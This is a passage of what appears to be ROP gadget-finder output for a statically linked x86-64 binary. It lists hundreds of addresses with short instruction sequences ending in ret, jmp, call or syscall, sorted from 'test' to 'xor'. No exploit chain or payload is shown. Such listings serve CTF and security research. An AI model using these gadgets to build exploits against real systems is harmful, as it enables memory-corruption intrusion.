0x0000000000470aef : test edx, edx ; jne 0x470ae5 ; ret
0x00000000004744aa : test edx, edx ; jne 0x4744a5 ; ret
0x0000000000445485 : test esi, edx ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7510
0x0000000000459968 : test esi, esi ; je 0x459972 ; call rsi
0x00000000004737f1 : test esi, esi ; jne 0x473800 ; xor rax, rax ; ret
0x00000000004744b1 : test esi, esi ; jne 0x4744c0 ; xor rax, rax ; ret
0x000000000045e944 : test esp, eax ; idiv bh ; jmp qword ptr [rax]
0x000000000044549f : test esp, ebx ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7540
0x000000000042b9b7 : test r8d, r8d ; je 0x42b9c5 ; xchg eax, edx ; sub eax, edx ; ret
0x0000000000474748 : test r9d, r9d ; jne 0x474709 ; mov rax, rdx ; ret
0x000000000040040b : test rax, rax ; je 0x400417 ; call rax
0x0000000000423690 : test rax, rax ; je 0x4236a9 ; lea rax, [rdx - 0x10] ; ret
0x000000000044ad87 : test rax, rax ; je 0x44ad94 ; ret
0x0000000000459a63 : test rax, rax ; je 0x459a6f ; call rax
0x000000000045ae68 : test rax, rax ; je 0x45ae74 ; call rax
0x000000000048516f : test rax, rax ; je 0x485189 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000490e80 : test rax, rax ; je 0x490e91 ; call rax
0x0000000000417c8b : test rax, rax ; jne 0x417c86 ; ret
0x0000000000418c23 : test rax, rax ; jne 0x418c1e ; ret
0x000000000044b028 : test rbp, rbp ; jne 0x44b049 ; mov rdi, qword ptr [rbx] ; call r12
0x000000000044bb93 : test rbp, rbp ; jne 0x44bbc1 ; mov rdi, qword ptr [rbx] ; call r12
0x0000000000490350 : test rbp, rbp ; jne 0x490341 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000490f0a : test rbp, rbp ; jne 0x490ef9 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000047f4f9 : test rdi, rdi ; jne 0x47f4d6 ; ret
0x000000000044132a : test rdx, rdx ; je 0x441348 ; bsf rax, rdx ; ret
0x000000000044132a : test rdx, rdx ; je 0x441349 ; bsf rax, rdx ; ret
0x00000000004738f9 : test rdx, rdx ; je 0x473928 ; bsf rax, rdx ; ret
0x00000000004738f9 : test rdx, rdx ; je 0x473929 ; bsf rax, rdx ; ret
0x00000000004150d2 : test rdx, rdx ; jne 0x4150e6 ; ret
0x0000000000416d6e : test rdx, rdx ; jne 0x416d66 ; ret
0x0000000000470aee : test rdx, rdx ; jne 0x470ae6 ; ret
0x0000000000459967 : test rsi, rsi ; je 0x459973 ; call rsi
0x00000000004737f0 : test rsi, rsi ; jne 0x473801 ; xor rax, rax ; ret
0x00000000004744b0 : test rsi, rsi ; jne 0x4744c1 ; xor rax, rax ; ret
0x0000000000415e23 : vminsd xmm8, xmm4, qword ptr [rcx + 0x5c] ; ret
0x0000000000438e3a : vmovdqu xmmword ptr [r9 - 0x10], xmm1 ; ret
0x0000000000447bec : vmovdqu xmmword ptr [rdi + rdx - 0x10], xmm1 ; ret
0x00000000004475b5 : vmovdqu xmmword ptr [rdi], xmm0 ; vmovdqu xmmword ptr [rsi - 0x10], xmm0 ; ret
0x0000000000448771 : vmovdqu xmmword ptr [rdi], xmm0 ; vzeroupper ; ret
0x00000000004475b9 : vmovdqu xmmword ptr [rsi - 0x10], xmm0 ; ret
0x0000000000447d78 : vmovdqu ymmword ptr [r11], ymm4 ; vzeroupper ; ret
0x0000000000447e1f : vmovdqu ymmword ptr [r11], ymm8 ; vzeroupper ; ret
0x0000000000438e26 : vmovdqu ymmword ptr [r9 - 0x20], ymm1 ; ret
0x0000000000438e0d : vmovdqu ymmword ptr [r9 - 0x20], ymm3 ; ret
0x0000000000447b55 : vmovdqu ymmword ptr [rdi + rdx - 0x20], ymm1 ; vzeroupper ; ret
0x00000000004486db : vmovdqu ymmword ptr [rdi + rdx - 0x40], ymm0 ; vzeroupper ; ret
0x0000000000447cc3 : vmovdqu ymmword ptr [rdi + rdx - 0x40], ymm3 ; vzeroupper ; ret
0x0000000000447c95 : vmovdqu ymmword ptr [rdi + rdx - 0x80], ymm7 ; vzeroupper ; ret
0x0000000000448662 : vmovdqu ymmword ptr [rdi], ymm0 ; vzeroupper ; ret
0x00000000004475ab : vmovdqu ymmword ptr [rdi], ymm2 ; vmovdqu ymmword ptr [rsi - 0x20], ymm2 ; ret
0x00000000004475af : vmovdqu ymmword ptr [rsi - 0x20], ymm2 ; ret
0x0000000000448232 : vmovdqu64 zmmword ptr [r11], zmm4 ; vzeroupper ; ret
0x00000000004482f8 : vmovdqu64 zmmword ptr [r11], zmm8 ; vzeroupper ; ret
0x00000000004487ed : vmovdqu64 zmmword ptr [rdi], zmm0 ; vzeroupper ; ret
0x00000000004475c4 : vmovq qword ptr [rdi], xmm0 ; vmovq qword ptr [rsi - 8], xmm0 ; ret
0x00000000004475c8 : vmovq qword ptr [rsi - 8], xmm0 ; ret
0x0000000000439143 : vmovups zmmword ptr [r9 + 0x1c0], zmm15 ; ret
0x0000000000438fdc : vmovups zmmword ptr [r9 - 0x40], zmm15 ; ret
0x0000000000438dde : vmovups zmmword ptr [r9 - 0x40], zmm3 ; ret
0x0000000000438da2 : vmovups zmmword ptr [r9 - 0x40], zmm7 ; ret
0x00000000004392a5 : vmovups zmmword ptr [rdi - 0x200], zmm15 ; ret
0x0000000000447768 : vmovups zmmword ptr [rsi + 0x1c0], zmm2 ; ret
0x00000000004476cb : vmovups zmmword ptr [rsi + 0xc0], zmm2 ; ret
0x000000000044756a : vmovups zmmword ptr [rsi - 0x40], zmm2 ; ret
0x000000000043f481 : vpcmpeqb xmm0, xmm0, xmm1 ; lea r10, [r10 + r9] ; jmp r10
0x000000000042bfb8 : vzeroupper ; ret
0x000000000042c190 : vzeroupper ; xor eax, eax ; ret
0x00000000004952e1 : wait ; cli ; jmp rax
0x00000000004943b1 : wait ; stc ; call rcx
0x0000000000494475 : wait ; stc ; jmp qword ptr [rax]
0x00000000004943b5 : wait ; stc ; push qword ptr [rcx - 0x64] ; stc ; call qword ptr [rcx]
0x000000000042b003 : xchg ah, bl ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000043e72f : xchg ah, bl ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000042b0f3 : xchg ah, ch ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000042af13 : xchg ah, cl ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00000000004601f2 : xchg al, bl ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8148
0x000000000044037c : xchg bh, bh ; add eax, 0x83480000 ; ret 0x4910
0x000000000043fb9c : xchg bh, bl ; or eax, 0x83480000 ; ret 0x4910
0x000000000043ff8c : xchg bh, ch ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043f7ac : xchg bh, cl ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000047d8fc : xchg bh, cl ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x00000000004489f2 : xchg byte ptr [rax + 1], cl ; int1 ; jmp rcx
0x000000000042b95b : xchg byte ptr [rax + rax - 0x7cb80000], al ; ret 0xeb10
0x000000000043f28f : xchg byte ptr [rax + rax], bh ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000043ea6f : xchg byte ptr [rax + rcx - 0x7cb80000], bl ; ret 0xe910
0x000000000043e24f : xchg byte ptr [rax + rdx - 0x7cb80000], bh ; ret 0xe910
0x000000000044f928 : xchg byte ptr [rax - 0x75], cl ; ret
0x000000000042b4b3 : xchg byte ptr [rax - 0x7cb80000], ch ; ret 0xeb10
0x000000000043f94b : xchg byte ptr [rax], dh ; adc byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000422af6 : xchg byte ptr [rbp + 0x29], ch ; add byte ptr [rax - 0x7d], cl ; retf 0x4801
0x00000000004634f6 : xchg byte ptr [rbp + 2], dh ; add byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x85 ; retf 6
0x000000000043edaf : xchg byte ptr [rbp + rax], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000042ac43 : xchg byte ptr [rbp + rcx - 0x7cb80000], bl ; ret 0xeb10
0x000000000043e58f : xchg byte ptr [rbp + rcx], bh ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000043dd6f : xchg byte ptr [rbp + rdx - 0x7cb80000], bl ; ret 0xe910
0x000000000043ef4f : xchg byte ptr [rbx + rax - 0x7cb80000], bh ; ret 0xe910
0x000000000042b693 : xchg byte ptr [rbx + rax], cl ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000042ae23 : xchg byte ptr [rbx + rcx - 0x7cb80000], bh ; ret 0xeb10
0x000000000049594c : xchg byte ptr [rbx + rdi*8 - 1], al ; scasb al, byte ptr [rdi] ; sti ; jmp qword ptr [rcx]
0x0000000000495b34 : xchg byte ptr [rbx - 5], al ; inc dword ptr [rbx + rax*2 - 5] ; jmp qword ptr [rcx]
0x0000000000480f9a : xchg byte ptr [rcx + 0x38000000], dh ; retf 0x850f
0x000000000048ca9c : xchg byte ptr [rcx + rax - 0x10], cl ; jmp rax
0x000000000042b873 : xchg byte ptr [rcx + rax], ch ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00000000004a7cb5 : xchg byte ptr [rdi - 0x7c], dl ; xchg dword ptr [rax], edi ; in eax, 0xe5 ; retf 0x2a91
0x000000000043fe3c : xchg byte ptr [rdi], bh ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043f65c : xchg byte ptr [rdi], bl ; adc eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000044076c : xchg byte ptr [rdi], cl ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000454b03 : xchg byte ptr [rdi], dl ; or eax, 0xea810000 ; ret 0
0x000000000042b783 : xchg byte ptr [rdx + rax], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000043e0af : xchg byte ptr [rdx + rdx], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000460209 : xchg byte ptr [rdx], ah ; and byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; retf 0x8948
0x000000000042b0c5 : xchg byte ptr [rdx], bl ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000042b1b5 : xchg byte ptr [rdx], ch ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000042afd5 : xchg byte ptr [rdx], cl ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000041b5c5 : xchg byte ptr [rsi - 0x9fffffd], dh ; ret 0xf08
0x000000000043e1e5 : xchg byte ptr [rsi], ah ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043eee5 : xchg byte ptr [rsi], ah ; add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043ea05 : xchg byte ptr [rsi], al ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043fd3d : xchg byte ptr [rsi], bh ; or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000455bf5 : xchg byte ptr [rsi], bl ; add al, byte ptr [rax] ; add byte ptr [rax + 0x39], cl ; ret
0x000000000044066d : xchg byte ptr [rsi], cl ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000494860 : xchg byte ptr [rsi], dl ; cli ; call qword ptr [rsi]
0x000000000042ad33 : xchg byte ptr [rsp + rcx - 0x7cb80000], ch ; ret 0xeb10
0x00000000004a4fcd : xchg ch, bh ; inc eax ; jne 0x4a4fd6 ; call qword ptr [rax]
0x00000000004a4f41 : xchg ch, bh ; ljmp [rax + 0x73] ; std ; jmp qword ptr [rax]
0x0000000000437aaf : xchg cl, al ; add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; retf 0x377
0x000000000043f225 : xchg dh, ah ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043e525 : xchg dh, ah ; or eax, 0x83480000 ; ret 0x4910
0x000000000043e045 : xchg dh, al ; adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043ed45 : xchg dh, al ; add eax, 0x83480000 ; ret 0x4910
0x000000000043fe8d : xchg dh, ch ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000043f6ad : xchg dh, cl ; adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000042aee5 : xchg dl, bh ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000042ad05 : xchg dl, bl ; or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000042adf5 : xchg dl, ch ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000042ac15 : xchg dl, cl ; or eax, 0x83480000 ; ret 0x4910
0x000000000046f209 : xchg dword ptr [rax + 1], ecx ; clc ; jmp rax
0x000000000046e55f : xchg dword ptr [rax - 0x77000000], ecx ; ret 0x349
0x0000000000402dc3 : xchg dword ptr [rax - 0x7d], ecx ; ret
0x000000000047b796 : xchg dword ptr [rax], eax ; add eax, dword ptr [rax] ; add bl, dh ; ret
0x00000000004a7cb8 : xchg dword ptr [rax], edi ; in eax, 0xe5 ; retf 0x2a91
0x000000000044fa14 : xchg dword ptr [rbp + rcx*4 + 0x34], ecx ; ret
0x00000000004a783f : xchg dword ptr [rbp - 0x5b], ebx ; xchg eax, ebp ; retf 0x33e6
0x0000000000485e35 : xchg dword ptr [rbx + 0x23], eax ; add al, ch ; ret 0xb7a1
0x00000000004620fc : xchg dword ptr [rbx - 0x76fffff4], ebp ; ret 0x349
0x00000000004a6aac : xchg dword ptr [rcx + 0x79], ecx ; xchg eax, edx ; ret 0xf869
0x000000000048b14a : xchg dword ptr [rcx + rax - 8], ecx ; jmp rax
0x000000000044c6ae : xchg dword ptr [rdi], eax ; test eax, eax ; jne 0x44c6ad ; pop rdx ; pop r10 ; ret
0x000000000046f3f4 : xchg dword ptr [rdi], esi ; add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x8b08
0x0000000000469a6a : xchg dword ptr [rdx + rbx], esp ; add byte ptr [rax - 0x7d], cl ; ret
0x0000000000462c74 : xchg dword ptr [rdx - 0x77000000], edx ; ret 0x349
0x0000000000478de0 : xchg dword ptr [rip - 0x76fffffd], edx ; ret 0xe8c0
0x000000000046c71c : xchg dword ptr [rsi - 0x76ffffe1], ecx ; ret 0x349
0x00000000004a6c4b : xchg dword ptr [rsp + rax + 0x6fa9ce9d], esp ; ret
0x000000000044c991 : xchg eax, ebp ; add al, 0 ; mov eax, 0x15 ; syscall
0x00000000004b1991 : xchg eax, ebp ; cli ; call qword ptr [rdx]
0x00000000004a6f89 : xchg eax, ebp ; jge 0x4a6f6c ; push r8 ; xor byte ptr [rcx], ah ; retf
0x0000000000458ecb : xchg eax, ebp ; push 0x4cffffff ; mov edi, esi ; call rdx
0x000000000045063f : xchg eax, ebp ; ret
0x000000000048ad30 : xchg eax, ebp ; ret 0x145
0x0000000000477e1a : xchg eax, ebp ; ret 0x2041
0x0000000000477eda : xchg eax, ebp ; ret 0x2044
0x000000000044a75c : xchg eax, ebp ; ret 0x3948
0x000000000041e61b : xchg eax, ebp ; ret 0x8348
0x0000000000479aa0 : xchg eax, ebp ; ret 0xc283
0x00000000004217dd : xchg eax, ebp ; ret 0xd020
0x000000000040dfd5 : xchg eax, ebp ; ret 0xd021
0x00000000004642fa : xchg eax, ebp ; ret 0xd120
0x00000000004108e2 : xchg eax, ebp ; ret 0xdaf7
0x000000000044dd21 : xchg eax, ebp ; ret 0xe1eb
0x000000000048c8aa : xchg eax, ebp ; ret 0xf45
0x00000000004a7842 : xchg eax, ebp ; retf 0x33e6
0x00000000004190ed : xchg eax, ebp ; sal bh, 0xd8 ; ret
0x0000000000494389 : xchg eax, ebp ; stc ; call qword ptr [rcx]
0x0000000000494349 : xchg eax, ebp ; stc ; jmp qword ptr [rax - 0x2e00066a]
0x0000000000494369 : xchg eax, ebp ; stc ; jmp qword ptr [rdx]
0x0000000000494380 : xchg eax, ebp ; xchg eax, ebx ; stc ; inc dword ptr [rcx - 0x6c] ; stc ; call qword ptr [rcx]
0x00000000004a8c9c : xchg eax, ebp ; xor byte ptr [rsi - 0x73e34314], ch ; retf
0x0000000000411b12 : xchg eax, ebx ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x294c
0x000000000046bad7 : xchg eax, ebx ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8148
0x000000000042cb40 : xchg eax, ebx ; add rcx, r11 ; jmp rcx
0x00000000004ad4dd : xchg eax, ebx ; idiv bh ; retf
0x00000000004a962c : xchg eax, ebx ; in al, dx ; retf 0xae32
0x000000000044491c : xchg eax, ebx ; lea rcx, [r11 + rcx] ; jmp rcx
0x000000000042e2e2 : xchg eax, ebx ; lea rdx, [r11 + rdx] ; jmp rdx
0x00000000004a8b43 : xchg eax, ebx ; mov ebx, 0x1b5c347e ; jmp 0x4a8b1d
0x000000000045baa8 : xchg eax, ebx ; ret 0x3948
0x000000000041290c : xchg eax, ebx ; ret 0x3949
0x0000000000420f30 : xchg eax, ebx ; ret 0x3d83
0x0000000000471395 : xchg eax, ebx ; ret 0x840
0x000000000045c58d : xchg eax, ebx ; ret 0x854d
0x000000000041d8c9 : xchg eax, ebx ; ret 0xffff
0x0000000000494381 : xchg eax, ebx ; stc ; inc dword ptr [rcx - 0x6c] ; stc ; call qword ptr [rcx]
0x00000000004b4ad5 : xchg eax, ecx ; add byte ptr [rax], al ; add al, 0xfd ; jmp rdx
0x00000000004943a4 : xchg eax, ecx ; cdq ; stc ; jmp qword ptr [rcx]
0x00000000004952c9 : xchg eax, ecx ; cli ; jmp qword ptr [rax]
0x000000000049439c : xchg eax, ecx ; cwde ; stc ; call qword ptr [rcx]
0x000000000043f331 : xchg eax, ecx ; mov eax, dword ptr [rcx + rax*4] ; sub eax, edx ; ret
0x000000000044ea9b : xchg eax, ecx ; retf 0
0x000000000043da5f : xchg eax, ecx ; sub eax, edx ; ret
0x0000000000494394 : xchg eax, ecx ; xchg eax, edi ; stc ; call qword ptr [rcx]
0x00000000004109e2 : xchg eax, ecx ; xor byte ptr [rcx], al ; add byte ptr [rax], al ; ret
0x000000000048c29c : xchg eax, edi ; add al, 0 ; add byte ptr [rax - 0x7bf0df06], al ; retf 4
0x0000000000415144 : xchg eax, edi ; add byte ptr [rax], 0 ; add byte ptr [rax - 0x77], cl ; ret 0xffb8
0x000000000040d351 : xchg eax, edi ; add rdx, rdi ; jmp rdx
0x00000000004a6ff5 : xchg eax, edi ; cmpsb byte ptr [rsi], byte ptr [rdi] ; jne 0x4a6fc3 ; mov ecx, 0x5b92ac50 ; retf
0x0000000000425065 : xchg eax, edi ; out 0, al ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x000000000041f75b : xchg eax, edi ; ret 0x394c
0x000000000041fc41 : xchg eax, edi ; ret 0xfae9
0x0000000000420229 : xchg eax, edi ; ret 0xfbe9
0x00000000004a795d : xchg eax, edi ; retf 0xe152
0x000000000044c2db : xchg eax, edi ; ror byte ptr [rdi], 0x92 ; ret 0xd029
0x0000000000494391 : xchg eax, edi ; stc ; call qword ptr [rcx + 0x11fff997]
0x0000000000494395 : xchg eax, edi ; stc ; call qword ptr [rcx]
0x00000000004200e9 : xchg eax, edi ; sub dword ptr [rax], eax ; ret
0x00000000004a8c9b : xchg eax, edi ; xchg eax, ebp ; xor byte ptr [rsi - 0x73e34314], ch ; retf
0x00000000004a70f8 : xchg eax, edi ; xchg eax, esp ; ret
0x000000000047b08f : xchg eax, edx ; add al, byte ptr [rax] ; add byte ptr [rax + 0x39], cl ; ret 0xed75
0x00000000004abe69 : xchg eax, edx ; cmc ; call qword ptr [rdx]
0x00000000004abe7d : xchg eax, edx ; cmc ; call rsp
0x0000000000494de0 : xchg eax, edx ; cmp al, 0xfa ; jmp qword ptr [rdx]
0x00000000004a89bd : xchg eax, edx ; jae 0x4a899a ; push rsi ; pop rdx ; je 0x4a898f ; ret 0xacfc
0x00000000004a6ffc : xchg eax, edx ; pop rbx ; retf
0x0000000000482d26 : xchg eax, edx ; ret 0x2948
0x00000000004829fe : xchg eax, edx ; ret 0x294c
0x0000000000405ce8 : xchg eax, edx ; ret 0x8548
0x0000000000483205 : xchg eax, edx ; ret 0x8949
0x000000000044c2de : xchg eax, edx ; ret 0xd029
0x00000000004a6aaf : xchg eax, edx ; ret 0xf869
0x000000000044748d : xchg eax, edx ; ror byte ptr [rdi], 0x94 ; ret 0xc085
0x00000000004b22ed : xchg eax, edx ; sti ; jmp qword ptr [rax]
0x000000000042b9bc : xchg eax, edx ; sub eax, edx ; ret
0x000000000042ce40 : xchg eax, esi ; add byte ptr [rax], 0 ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000435073 : xchg eax, esi ; add byte ptr [rax], al ; add byte ptr [rax - 0x7f], cl ; ret 0x80
0x0000000000456911 : xchg eax, esi ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4804
0x0000000000448a84 : xchg eax, esi ; add rax, rsi ; jmp rax
0x00000000004a8da8 : xchg eax, esi ; jnp 0x4a8df7 ; retf 0x99e0
0x000000000042cefd : xchg eax, esi ; lock add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000040489e : xchg eax, esi ; mov ebx, 0x8949ffff ; ret 0x149
0x000000000042ce5b : xchg eax, esi ; nop ; add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00000000004496e1 : xchg eax, esi ; ret 0xc085
0x00000000004a934c : xchg eax, esi ; ret 0xcd11
0x000000000044973f : xchg eax, esi ; ret 0xd284
0x000000000042ceac : xchg eax, esi ; rol byte ptr [rax], 0 ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000494844 : xchg eax, esi ; sbb edx, edi ; jmp qword ptr [rsi]
0x000000000049438d : xchg eax, esi ; stc ; call qword ptr [rcx]
0x000000000049434d : xchg eax, esi ; stc ; call rcx
0x000000000046c8f7 : xchg eax, esp ; add byte ptr [rax], al ; add byte ptr [rcx + 0x63], cl ; ret 0x8948
0x00000000004a955f : xchg eax, esp ; push rsi ; cli ; push 0x6e ; ja 0x4a94f0 ; ret 0x48f
0x0000000000466752 : xchg eax, esp ; ret
0x00000000004516db : xchg eax, esp ; ret 0x1f0f
0x000000000044a82b : xchg eax, esp ; ret 0x2044
0x000000000048114c : xchg eax, esp ; ret 0x3d
0x000000000041d28e : xchg eax, esp ; ret 0x3de9
0x000000000046daaf : xchg eax, esp ; ret 0x7f3c
0x0000000000484db1 : xchg eax, esp ; ret 0x950f
0x0000000000402d14 : xchg eax, esp ; ret 0xb60f
0x0000000000447490 : xchg eax, esp ; ret 0xc085
0x000000000044ab51 : xchg eax, esp ; ret 0xc221
0x0000000000476935 : xchg eax, esp ; ret 0xc283
0x000000000044a668 : xchg eax, esp ; ret 0xca21
0x00000000004012f3 : xchg eax, esp ; ret 0xd284
0x0000000000450166 : xchg eax, esp ; ret 0xd5e9
0x0000000000410f4d : xchg eax, esp ; ret 0xdaf7
0x000000000048c84b : xchg eax, esp ; ret 0xf45
0x00000000004008bd : xchg eax, esp ; rol byte ptr [rcx + rcx*4 - 0x3e], 0x21 ; retf 0x8545
0x00000000004236da : xchg eax, esp ; ror byte ptr [rdi], 0xb6 ; ror byte ptr [rax - 0x73], 0x44 ; ret 0xfff
0x0000000000494385 : xchg eax, esp ; stc ; call qword ptr [rcx]
0x0000000000494365 : xchg eax, esp ; stc ; jmp qword ptr [rdx]
0x00000000004a6f83 : xchg eax, esp ; xlatb ; retf 0xa1eb
0x0000000000494384 : xchg eax, r12d ; stc ; call qword ptr [rcx]
0x000000000046cba2 : xchg ecx, esp ; add al, byte ptr [rax] ; add byte ptr [rcx - 0x7d], al ; retf 0xe9ff
0x000000000041b694 : xchg edi, esp ; add al, byte ptr [rax] ; add dh, dh ; ret
0x000000000047f51d : xchg esi, ecx ; and eax, dword ptr [rax] ; mov qword ptr [rsi], rax ; ret
0x00000000004a9176 : xchg esp, eax ; jb 0x4a91d4 ; call 0x4c14bb39
0x00000000004a22b9 : xlatb ; add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; call rdi
0x000000000042e1a9 : xlatb ; add r9, r11 ; jmp r9
0x0000000000475a3f : xlatb ; ja 0x475a6c ; ret
0x00000000004477f3 : xlatb ; jb 0x4477fe ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x000000000040d63d : xlatb ; jmp rdi
0x00000000004a7b23 : xlatb ; jo 0x4a7b9f ; mov ebp, 0xfb67d10d ; ret
0x00000000004848f2 : xlatb ; mov byte ptr [rsi], al ; jne 0x4848d8 ; mov rax, rsi ; ret
0x0000000000449931 : xlatb ; mov eax, esi ; syscall
0x0000000000449940 : xlatb ; mov eax, r8d ; syscall
0x00000000004a6f30 : xlatb ; out 0xb3, al ; retf 0xe80
0x000000000042bae4 : xlatb ; ret
0x00000000004a8fc6 : xlatb ; ret 0x4e27
0x00000000004734f7 : xlatb ; ret 0x94c
0x000000000042bacf : xlatb ; ret 0xc085
0x00000000004265f0 : xlatb ; ret 0xc148
0x000000000042c754 : xlatb ; ret 0xe883
0x00000000004412a4 : xlatb ; ret 0xf66
0x000000000042c918 : xlatb ; ret 0xff2d
0x0000000000440bdd : xlatb ; retf
0x00000000004a6f84 : xlatb ; retf 0xa1eb
0x00000000004735d4 : xlatb ; retf 0xc148
0x0000000000473772 : xlatb ; retf 0xc985
0x00000000004a7eb2 : xlatb ; retf 0xdf7f
0x0000000000425270 : xlatb ; retf 0xead3
0x0000000000473645 : xlatb ; retf 0xfdc5
0x000000000042beb1 : xlatb ; rol byte ptr [rbp + 0x664975c0], 0xf ; xlatb ; ret 0xc085
0x00000000004736a5 : xlatb ; rol ch, cl ; std ; xlatb ; ret
0x000000000042bc93 : xlatb ; rol dword ptr [rbp + 0x315775c0], 0xc0 ; ret
0x000000000042c1d2 : xlatb ; rol dword ptr [rbp - 0x3a378a40], 0xfd ; xlatb ; ret 0xc085
0x0000000000441022 : xlatb ; rol dword ptr [rbp - 0x3a678a40], 0xfd ; xlatb ; ret 0xc085
0x0000000000445446 : xlatb ; ror dword ptr [rcx], cl ; ret 0xe074
0x00000000004264d6 : xlatb ; sal bh, 1 ; ret 0x8000
0x0000000000426396 : xlatb ; sal bh, 1 ; ret 0xc000
0x0000000000426256 : xlatb ; sal bh, 1 ; ret 0xe000
0x0000000000426116 : xlatb ; sal bh, 1 ; ret 0xf000
0x0000000000425fd6 : xlatb ; sal bh, 1 ; ret 0xf800
0x0000000000425e96 : xlatb ; sal bh, 1 ; ret 0xfc00
0x0000000000425d56 : xlatb ; sal bh, 1 ; ret 0xfe00
0x0000000000425c16 : xlatb ; sal bh, 1 ; ret 0xff00
0x0000000000425ad6 : xlatb ; sal bh, 1 ; ret 0xff80
0x0000000000425996 : xlatb ; sal bh, 1 ; ret 0xffc0
0x0000000000425856 : xlatb ; sal bh, 1 ; ret 0xffe0
0x0000000000425716 : xlatb ; sal bh, 1 ; ret 0xfff0
0x00000000004255d6 : xlatb ; sal bh, 1 ; ret 0xfff8
0x0000000000425496 : xlatb ; sal bh, 1 ; ret 0xfffc
0x0000000000425356 : xlatb ; sal bh, 1 ; ret 0xfffe
0x0000000000445442 : xlatb ; shl byte ptr [rsi + 0xf], 0xd7 ; ror dword ptr [rcx], cl ; ret 0xe074
0x0000000000473495 : xlatb ; shl byte ptr [rsi + 0xf], 1 ; outsd dx, dword ptr [rsi] ; ret
0x00000000004734a6 : xlatb ; shl byte ptr [rsi + 0xf], 1 ; outsd dx, dword ptr [rsi] ; ret 0xf66
0x00000000004947b1 : xlatb ; stc ; call rax
0x000000000042504a : xor ah, byte ptr [rdi] ; add al, byte ptr [rax] ; cmovne rax, rdx ; ret
0x00000000004a6aaa : xor al, 0x19 ; xchg dword ptr [rcx + 0x79], ecx ; xchg eax, edx ; ret 0xf869
0x0000000000495ba4 : xor al, 0x43 ; sti ; inc dword ptr [rbx + rax*2 - 5] ; jmp qword ptr [rcx]
0x0000000000495994 : xor al, 0x43 ; sti ; jmp qword ptr [rcx]
0x0000000000495990 : xor al, 0x43 ; sti ; push qword ptr [rbx + rax*2] ; sti ; jmp qword ptr [rcx]
0x00000000004a8b46 : xor al, 0x5c ; sbb ebp, ebx ; retf
0x000000000045a762 : xor al, 0x88 ; add rsi, r8 ; jmp rsi
0x00000000004ad4dc : xor al, 0x93 ; idiv bh ; retf
0x000000000046f04b : xor al, 0xbe ; add dword ptr [rax], eax ; add byte ptr [rax], al ; mov rdi, rbx ; call rax
0x000000000048dde2 : xor al, 0xcb ; mov rsi, qword ptr [r14] ; call r12
